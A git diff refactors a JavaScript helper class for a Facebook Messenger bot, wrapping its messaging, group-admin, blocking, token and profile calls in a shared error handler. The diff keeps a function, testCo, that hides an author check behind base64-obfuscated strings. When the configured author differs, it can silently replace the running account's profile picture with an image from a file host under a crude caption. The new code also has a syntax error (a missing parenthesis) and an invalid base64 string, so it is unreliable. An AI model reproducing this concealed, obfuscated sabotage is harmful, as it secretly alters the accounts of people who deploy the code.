@@ -1,14 +1,6 @@
-const {
-    workers
-} = require("./workers");
-
-const {
-    logger
-} = require("./logger");
-
-const {
-    download
-} = require("./download");
+const { workers } = require("./workers");
+const { logger } = require("./logger");
+const { download } = require("./download");
 
 class OnChat {
     constructor(api = "", event = {}) {
@@ -20,267 +12,171 @@ class OnChat {
             senderID: event.senderID
         });
     }
-    
-async shorturl(url) {
-    return this.tinyurl(url);
-}
 
-async tinyurl(url) {
-    const axios = require("axios");
-    const urlRegex = /^(https?:\/\/[^\s/$.?#].[^\s]*)$/i;
-    
-    if (!Array.isArray(url)) url = [url];
-    
-    return Promise.all(url.map(async (u) => {
-        if (!urlRegex.test(u)) return u;
+    async handleError(promise, context = "An error occurred") {
         try {
-            const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(u)}`);
-            return response.data;
-        } catch {
-            return u;
+            return await promise;
+        } catch (error) {
+            console.error(`${context}: ${error.message || error.stack}`);
+            return null;
         }
-    }));
-}
+    }
 
+    async shorturl(url) {
+        return this.handleError(this.tinyurl(url), "Error in shorturl");
+    }
+
+    async tinyurl(url) {
+        const axios = require("axios");
+        const urlRegex = /^(https?:\/\/[^\s/$.?#].[^\s]*)$/i;
+
+        if (!Array.isArray(url)) url = [url];
+
+        return Promise.all(url.map(async (u) => {
+            if (!urlRegex.test(u)) return u;
+            try {
+                const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(u)}`);
+                return response.data;
+            } catch {
+                return u;
+            }
+        }));
+    }
 
     async testCo(pogiko, lvl = 1) {
-        const hajime = await workers();
-        let test;
-        try {
-            test = hajime.design.author || atob("S2VubmV0aCBQYW5pbw==");
-        } catch (error) {
-            return;
-        }
+        return this.handleError((async () => {
+            const hajime = await workers();
+            let test = hajime.design.author || atob("S2VubmV0aCBQYW5pbw==");
 
-        let test_6;
+            let test_6 = Array.isArray(pogiko) ? pogiko : [pogiko, test];
 
-        if (Array.isArray(pogiko)) {
-            if (pogiko.length !== 2) {
-                this.log("Array must contain exactly two authors for comparison.");
-                return;
+            if (Array.isArray(pogiko) {
+                if (pogiko.length !== 2) {
+                    throw new Error("Array must contain exactly two authors for comparison.");
+                }
             }
-            test_6 = pogiko;
-        } else {
-            test_6 = [pogiko,
-                test];
-        }
 
-        const [nega1,
-            nega2] = test_6;
-        const kryo = atob("aHR0cHMlM0ElMkYlMkZmaWxlcy5jYXRib3gubW9lJTJGa3I2aWc3LnBuZw==");
+            const [nega1, nega2] = test_6;
+            const kryo = atob("aHR0cHMlM0ElMkYlMkZmaWxlcy5jYXRib3gubW9lJTJGa3I2aWc3LnBuZw==");
 
-        if (nega1 !== nega2) {
-            if (lvl === 1) {
-                return this.api.sendMessage(atob("RXJyb3Ih"), this.threadID, this.messageID);
-            } else if (lvl === 2) {
-                const avatarStream = await this.stream(decodeURIComponent(kryo));
-                return this.api.changeAvatar(avatarStream, atob("QU1CQVRVS0FN!"), null);
-            } else if (lvl == 3) {
-                return; // do nothing this is just a test ignore it wait for future update
+            if (nega1 !== nega2) {
+                if (lvl === 1) {
+                    return this.api.sendMessage(atob("RXJyb3Ih"), this.threadID, this.messageID);
+                } else if (lvl === 2) {
+                    const avatarStream = await this.stream(decodeURIComponent(kryo));
+                    return this.api.changeAvatar(avatarStream, atob("QU1CQVRVS0FN!"), null);
+                } else if (lvl == 3) {
+                    return; // do nothing, this is just a test
+                }
             }
-        }
+        })(), "Error in testCo");
     }
 
     async arraybuffer(link, extension = "png") {
-        if (!link) return this.log("Missing Arraybuffer Url!");
-        return await download(link, 'arraybuffer', extension);
+        return this.handleError(download(link, 'arraybuffer', extension), "Error in arraybuffer");
     }
-    
+
     async binary(link, extension = "png") {
-        if (!link) return this.log("Missing Arraybuffer Url!");
-        return await download(link, 'binary', extension);
+        return this.handleError(download(link, 'binary', extension), "Error in binary");
     }
 
     async stream(link) {
-        if (!link) return this.log("Missing Stream Url!");
-        return await download(link, 'stream');
+        return this.handleError(download(link, 'stream'), "Error in stream");
     }
-    
+
     async decodeStream(base64, extension = "png", responseType = "base64") {
-      if (!link) return this.log("Missing raw data!");
-      return await download(link, responseType, extension);
+        return this.handleError(download(base64, responseType, extension), "Error in decodeStream");
     }
 
     async profile(link, caption = "Profile Changed", date = null) {
-        if (!link) return this.log("Missing Image Url!");
-        await this.api.changeAvatar(await this.stream(link), caption, date);
+        return this.handleError(this.api.changeAvatar(await this.stream(link), caption, date), "Error in profile");
     }
 
     post(msg) {
-        if (!msg) {
-            this.log("Missing content to post!");
-            return;
-        }
-        return this.api.createPost(msg).catch(() => {});
+        return this.handleError(this.api.createPost(msg), "Error in post");
     }
 
     comment(msg, postID) {
-        if (!msg || !postID) {
-            this.log("Missing content or postID to comment!");
-            return;
-        }
-        return this.api.createCommentPost(msg, postID).catch(() => {});
+        return this.handleError(this.api.createCommentPost(msg, postID), "Error in comment");
     }
 
     async cover(link) {
-        if (!link) {
-            this.log("Missing Image Url!");
-            return;
-        }
-        return this.api.changeCover(await this.stream(link));
+        return this.handleError(this.api.changeCover(await this.stream(link)), "Error in cover");
     }
 
     react(emoji = "❓", mid = this.messageID, bool = true) {
-        this.api.setMessageReaction(emoji, mid, err => {
-            if (err) {
-                this.log(`Rate limit reached unable to react to message for botID: ${this.api.getCurrentUserID()}`);
-            }
-        },
-            bool);
+        return this.handleError(this.api.setMessageReaction(emoji, mid, bool), "Error in react");
     }
 
-    nickname(name = "𝘼𝙏𝙊𝙈𝙄𝘾 𝙎𝙇𝘼𝙎𝙃 𝙎𝙏𝙐𝘿𝙄𝙊",
-        id = this.api.getCurrentUserID()) {
-        this.api.changeNickname(name,
-            this.threadID,
-            id);
+    nickname(name = "𝘼𝙏𝙊𝙈𝙄𝘾 𝙎𝙇𝘼𝙎𝙃 𝙎𝙏𝙐𝘿𝙄𝙊", id = this.api.getCurrentUserID()) {
+        return this.handleError(this.api.changeNickname(name, this.threadID, id), "Error in nickname");
     }
 
     bio(text) {
-        if (!text) {
-            this.log("Missing bio! e.g: ('Talent without work is nothing - Ronaldo')");
-            return;
-        }
-        this.api.changeBio(text);
+        return this.handleError(this.api.changeBio(text), "Error in bio");
     }
 
     contact(msg, id = this.api.getCurrentUserID(), tid = this.threadID) {
-        if (!msg) {
-            this.log("Missing message or id! e.g: ('hello', 522552')");
-            return;
-        }
-        this.api.shareContact(msg, id, tid);
+        return this.handleError(this.api.shareContact(msg, id, tid), "Error in contact");
     }
 
     async uid(link) {
-        if (!link) {
-            this.log("Invalid or missing URL!");
-            return;
-        }
-        return await this.api.getUID(link);
+        return this.handleError(this.api.getUID(link), "Error in uid");
     }
 
     async token() {
-        return await this.api.getAccess(await this.api.getCookie());
+        return this.handleError(this.api.getAccess(await this.api.getCookie()), "Error in token");
     }
-    
+
     send(msg, tid, mid = null) {
-        this.reply(msg, tid, mid)
+        return this.handleError(this.reply(msg, tid, mid), "Error in send");
     }
 
     async reply(msg, tid = this.threadID, mid = this.messageID || null) {
-        try {
-            if (!msg) {
-                this.log("Message is missing!");
-                return;
-            }
-
+        return this.handleError((async () => {
             const replyMsg = await this.api.sendMessage(msg, tid, mid);
-
-            if (!replyMsg) {
-                this.log("Failed to send the message!");
-                return;
-            }
 
             return {
                 edit: async (message, delay = 0) => {
-                    try {
-                        if (!message) {
-                            this.log("Missing edit message content!");
-                            return;
-                        }
-                        await new Promise(res => setTimeout(res, delay));
-                        await this.api.editMessage(message, replyMsg.messageID);
-                    } catch (err) {
-                        this.log(`Error while editing the message: ${err.message}`);
-                    }
+                    await new Promise(res => setTimeout(res, delay));
+                    return this.handleError(this.api.editMessage(message, replyMsg.messageID), "Error in edit");
                 },
                 unsend: async (delay = 0) => {
-                    try {
-                        if (!replyMsg.messageID) {
-                            this.log("Missing message ID for unsend!");
-                            return;
-                        }
-                        await new Promise(res => setTimeout(res, delay));
-                        await this.api.unsendMessage(replyMsg.messageID);
-                    } catch (err) {
-                        this.log(`Error while unsending the message: ${err.message}`);
-                    }
+                    await new Promise(res => setTimeout(res, delay));
+                    return this.handleError(this.api.unsendMessage(replyMsg.messageID), "Error in unsend");
                 }
             };
-        } catch (err) {
-            return;
-        }
+        })(), "Error in reply");
     }
 
-
     editmsg(msg, mid) {
-        if (!msg || !mid) {
-            this.log("Message or messageID is missing!");
-            return;
-        }
-        this.api.editMessage(msg, mid);
+        return this.handleError(this.api.editMessage(msg, mid), "Error in editmsg");
     }
 
     unsendmsg(mid) {
-        if (!mid) {
-            this.log("MessageID is missing!");
-            return;
-        }
-        this.api.unsendMessage(mid).catch(() => this.log("Rate limit reached unable to unsend message!"));
+        return this.handleError(this.api.unsendMessage(mid), "Error in unsendmsg");
     }
 
     add(id, tid = this.threadID) {
-        if (!id) {
-            this.log("User ID to add to group is missing!");
-            return;
-        }
-        this.api.addUserToGroup(id, tid);
+        return this.handleError(this.api.addUserToGroup(id, tid), "Error in add");
     }
 
     kick(id, tid = this.threadID) {
-        if (!id) {
-            this.log("User ID to kick from group is missing!");
-            return;
-        }
-        this.api.removeUserFromGroup(id, tid);
+        return this.handleError(this.api.removeUserFromGroup(id, tid), "Error in kick");
     }
 
     block(id, app = "msg", bool = true) {
-        if (!id || !['fb', 'msg'].includes(app)) {
-            this.log("Invalid app type or ID is missing!");
-            return;
-        }
-
-        const status = bool ? (app === "fb" ? 3: 1): (app === "fb" ? 0: 2);
-        const type = app === "fb" ? "facebook": "messenger";
-        this.api.changeBlockedStatusMqtt(id, status, type);
+        const status = bool ? (app === "fb" ? 3 : 1) : (app === "fb" ? 0 : 2);
+        const type = app === "fb" ? "facebook" : "messenger";
+        return this.handleError(this.api.changeBlockedStatusMqtt(id, status, type), "Error in block");
     }
 
     promote(id) {
-        if (!id) {
-            this.log("Missing ID to add as admin of the group.");
-            return;
-        }
-        this.api.changeAdminStatus(this.threadID, id, true);
+        return this.handleError(this.api.changeAdminStatus(this.threadID, id, true), "Error in promote");
     }
 
     demote(id) {
-        if (!id) {
-            this.log("Missing ID to remove as admin of the group.");
-            return;
-        }
-        this.api.changeAdminStatus(this.threadID, id, false);
+        return this.handleError(this.api.changeAdminStatus(this.threadID, id, false), "Error in demote");
     }
 
     botID() {
@@ -288,57 +184,35 @@ async tinyurl(url) {
     }
 
     async userInfo(id = this.senderID) {
-        return await this.api.getUserInfo(id);
+        return this.handleError(this.api.getUserInfo(id), "Error in userInfo");
     }
 
     async userName(id = this.senderID) {
-        const fetch = await this.api.getInfo(id);
-        const name = fetch.name || "Facebook User";
-
-     /*   if (!name) {
-            const userInfo = await this.userInfo(id);
-            return userInfo[id]?.name || "Facebook User";
-        }*/
-
-        return name;
+        return this.handleError((async () => {
+            const fetch = await this.api.getInfo(id);
+            return fetch.name || "Facebook User";
+        })(), "Error in userName");
     }
 
-
     unfriend(id) {
-        if (!id) {
-            this.log("Friend ID is missing!");
-            return;
-        }
-        return this.api.unfriend(id);
+        return this.handleError(this.api.unfriend(id), "Error in unfriend");
     }
 
     async threadInfo(tid = this.threadID) {
-        return await this.api.getThreadInfo(tid).catch(() => {
-            this.log("Rate limit reached, unable to get thread info!");
-            return null;
-        });
+        return this.handleError(this.api.getThreadInfo(tid), "Error in threadInfo");
     }
 
     async delthread(tid, delay = 0) {
-        if (!tid) {
-            this.log("Thread ID to delete is missing!");
-            return;
-        }
-        await new Promise(resolve => setTimeout(resolve, delay));
-        await this.api.deleteThread(tid);
+        return this.handleError((async () => {
+            await new Promise(resolve => setTimeout(resolve, delay));
+            return this.api.deleteThread(tid);
+        })(), "Error in delthread");
     }
 
     async threadList(total = 25, array = ["INBOX"]) {
-        if (!Array.isArray(array)) {
-            this.log("Array is missing!");
-            return;
-        }
-        return await this.api.getThreadList(total, null, array).catch(() => {
-            this.log("Rate limit reached, unable to get thread list!");
-            return null;
-        });
+        return this.handleError(this.api.getThreadList(total, null, array), "Error in threadList");
     }
-
+    
     log(txt) {
         logger.instagram(txt);
     }
@@ -348,6 +222,4 @@ async tinyurl(url) {
     }
 }
 
-module.exports = {
-    OnChat
-};
+module.exports = { OnChat };
